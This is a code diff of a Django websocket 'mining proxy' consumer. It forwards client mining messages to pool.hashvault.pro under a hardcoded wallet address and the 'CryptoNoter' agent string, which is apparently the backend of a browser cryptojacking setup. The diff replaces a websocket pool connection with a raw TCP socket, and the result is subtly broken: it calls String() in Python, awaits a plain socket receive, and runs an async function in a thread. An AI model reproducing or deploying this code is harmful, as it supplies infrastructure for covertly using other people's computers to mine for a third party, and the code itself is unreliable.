@@ -5,70 +5,57 @@ from asgiref.sync import sync_to_async
 conf = {
     'pool': 'pool.hashvault.pro:80',
     'addr': '479TNkmiavNLJCd6SRG8b1asxQrgsfBWoSH4qbuJuaxTScTe29qZSJAZooGawjfTCuV1hfcnRvEzP3s3QMqBmCaz8iCeDxw',
-    'pass': 'x'
+    'pass': ''
 }
 
 async def connect_pool(self):
-    import websockets, os
+    import websockets, os, socket
     global conf
-    ws_url = 'ws://' + conf['pool']
+    pool = conf['pool'].split(':')
+    addr = socket.gethostbyname(pool[0])
+    ws_url = 'ws://{}:{}'.format(pool[0],pool[1])
     from django.conf import settings
-    print('Connecting to proxy listener')
-    try:
-        async with websockets.connect(ws_url) as ws:
-            await self.accept()
-            conn = {
-                'uid': None,
-                'pid': os.urandom(12).hex(),
-                'workerId': None,
-                'found': 0,
-                'accepted': 0,
-                'ws': self,
-                'pl': ws
-            }
-            print('Self is ' + str(self))
-            print('Connected.')
-            self.conn = conn
-            async def on_message(conn, ws, data):
-                try:
-                    print('Self is ' + str(self))
-                    conn = self.conn
-                    linesdata = data;
-                    lines = String(linesdata).split("\n");
-                    if len(lines[1]) > 0:
-                        print('[<] Response: ' + conn['pid'] + '\n\n' + lines[0] + '\n');
-                        print('[<] Response: ' + conn['pid'] + '\n\n' + lines[1] + '\n')
-                        await pool2ws(conn, lines[0])
-                        await pool2ws(conn, lines[1])
-                    else:
-                        print('[<] Response: ' + conn['pid'] + '\n\n' + data + '\n');
-                        await pool2ws(conn, data)
-                except:
-                    import traceback
-                    print(traceback.format_exc())
+    tmp = ws_url.split('//')[1]
+    hostname, port = tmp.split(':')
+    port = int(port)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((hostname, port))
+    params = {"login": conf['addr'], "pass": conf['pass'], "agent": 'CryptoNoter'}
+    conn = {
+        'uid': None,
+        'pid': os.urandom(12).hex(),
+        'workerId': None,
+        'found': 0,
+        'accepted': 0,
+        'ws': self,
+        'pl': sock
+    }
+    self.conn = conn
+    async def on_message(conn, ws, data):
+        try:
+            conn = self.conn
+            linesdata = data;
+            lines = String(linesdata).split("\n");
+            if len(lines[1]) > 0:
+                print('[<] Response: ' + conn['pid'] + '\n\n' + lines[0] + '\n');
+                print('[<] Response: ' + conn['pid'] + '\n\n' + lines[1] + '\n')
+                await pool2ws(conn, lines[0])
+                await pool2ws(conn, lines[1])
+            else:
+                print('[<] Response: ' + conn['pid'] + '\n\n' + data + '\n');
+                await pool2ws(conn, data)
+        except:
+            import traceback
+            print(traceback.format_exc())
 
-            while True:
-                try:
-                    response = await ws.recv()
-                    await on_message(conn, ws, data)
-                except websockets.ConnectionClosedError as e:
-                    print(f"Connection closed unexpectedly: {e}")
-                    print('PoolSocket closed\n');
-                    if self.connected:
-                        await self.disconnect(1)
-                    break
-                except websockets.ConnectionClosedOK as e:
-                    print(f"Connection closed normally: {e}")
-                    break
-                except websockets.WebSocketProtocolError as e:
-                    print(f"Protocol error: {e}")
-                    break
-                except websockets.InvalidStatusCode as e:
-                    print(f"Invalid status code: {e}")
-                    break
-
-    except Exception as e:
-        print(f"Failed to connect: {e}")
+    async def receive(self, conn, sock):
+        while self.connected:
+            data = await sock.recv(4096)
+            print(data)
+            await on_message(conn, sock, data)
+    import threading
+    t = threading.Thread(target=receive, args=(self, conn, sock))
+    t.start()
 
 async def ws2pool(conn, data):
     buf = None;
@@ -89,7 +76,7 @@ async def ws2pool(conn, data):
                 "id": conn['pid']
             }
             buf = json.dumps(buf) + '\n'
-            await conn['pl'].send(buf)
+            conn['pl'].send(buf.encode())
         case 'submit':
             conn['found']+=1
             buf = {
@@ -103,7 +90,7 @@ async def ws2pool(conn, data):
                 "id": conn['pid']
             }
             buf = json.dumps(buf) + '\n'
-            await conn['pl'].send(buf)
+            conn['pl'].send(buf.encode())
 
 async def pool2ws(conn, data):
     try:
@@ -171,10 +158,11 @@ class MiningProxyConsumer(AsyncWebsocketConsumer):
     ws = None
     async def connect(self):
         self.connected = True
+        await self.accept()
         await connect_pool(self)
 
     async def disconnect(self, close_code):
-#        print('[!] ' + self.conn['uid'] + ' offline.\n')
+        print('[!] ' + self.conn['uid'] + ' offline.\n')
         if self.conn:
             self.conn['pl'].close()
         self.connected = False
